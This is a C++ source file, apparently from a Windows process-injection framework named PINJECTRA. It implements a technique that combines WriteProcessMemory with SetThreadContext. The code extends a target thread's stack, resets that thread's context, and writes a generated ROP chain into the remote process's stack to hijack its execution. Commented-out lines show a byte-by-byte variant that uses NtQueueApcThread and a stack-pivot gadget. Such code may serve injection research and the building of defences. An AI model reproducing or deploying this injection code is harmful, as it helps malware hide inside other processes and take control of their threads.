
// Standard Include's
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <psapi.h>

// Local Include's
#include "WPM_STC.h"



PINJECTRA_PACKET* WriteProcessMemory_SetThreadContext::eval_and_write(TARGET_PROCESS* target, TStrDWORD64Map& params)
{
	//HMODULE ntdll = GetModuleHandleA("ntdll");
	HANDLE t = target->thread;
	PINJECTRA_PACKET* payload_output;

	// Evaluate Payload
	payload_output = this->m_rop_chain_gen->eval(params);
	TStrDWORD64Map& tMetadata = *payload_output->metadata;
	BOOL RetVal = FALSE;
	SIZE_T bytes_read = 0;

	DWORD64 orig_tos = tMetadata["orig_tos"];
	DWORD64 tos = tMetadata["tos"];
	DWORD64 rop_pos = tMetadata["rop_pos"];
	DWORD64* ROP_chain = (DWORD64*)payload_output->buffer;
	DWORD64 saved_return_address = tMetadata["saved_return_address"];
	DWORD64 GADGET_pivot = tMetadata["GADGET_pivot"];

	//NtQueueApcThread = (NTSTATUS(NTAPI*)(HANDLE, PVOID, PVOID, PVOID, __int64)) GetProcAddress(ntdll, "NtQueueApcThread");

	// Grow the stack to accommodate the new stack
	for (DWORD64 i = orig_tos - 0x1000; i >= tos; i -= 0x1000)
	{
		DWORD64 data = 0;
		RetVal = ReadProcessMemory(target->process, (void*)i, &data, 1, &bytes_read);
		RetVal = ReadProcessMemory(target->process, (void*)i, &data, 1, &bytes_read);
	}


	RetVal = SetThreadContext(target->thread, (CONTEXT*)tMetadata["context"]);
	// Write the new stack
	RetVal = WriteProcessMemory(target->process, (void*)tos, ROP_chain, rop_pos * sizeof(DWORD64), &bytes_read);

	//RetVal = WriteProcessMemory(target->process, (void*)ROP_chain[saved_return_address], (void*)orig_tos, 8, &bytes_read);
	//RetVal = WriteProcessMemory(target->process, (void*)orig_tos, (void*)&GADGET_pivot, 8, &bytes_read);
	//RetVal = WriteProcessMemory(target->process, (void*)(orig_tos+8), (void*)&tos, 8, &bytes_read);
	//for (int i = 0; i < rop_pos * sizeof(DWORD64); i++)
	//{
	//	(*NtQueueApcThread)(t, GetProcAddress(ntdll, "memset"), (void*)(tos + i), (void*)*(((BYTE*)ROP_chain) + i), 1);
	//}
	// Save the original return address into the new stack
	//(*NtQueueApcThread)(t, GetProcAddress(ntdll, "memmove"), (void*)(ROP_chain[saved_return_address]), (void*)orig_tos, 8);

	//// overwrite the original return address with GADGET_pivot
	//for (int i = 0; i < sizeof(tos); i++)
	//{
	//	(*NtQueueApcThread)(t, GetProcAddress(ntdll, "memset"), (void*)(orig_tos + i), (void*)(((BYTE*)&GADGET_pivot)[i]), 1);
	//}
	//// overwrite the original tos+8 with the new tos address (we don't need to restore this since it's shadow stack!
	//for (int i = 0; i < sizeof(tos); i++)
	//{
	//	(*NtQueueApcThread)(t, GetProcAddress(ntdll, "memset"), (void*)(orig_tos + 8 + i), (void*)(((BYTE*)&tos)[i]), 1);
	//}
	return payload_output;
}

WriteProcessMemory_SetThreadContext::~WriteProcessMemory_SetThreadContext() {

}
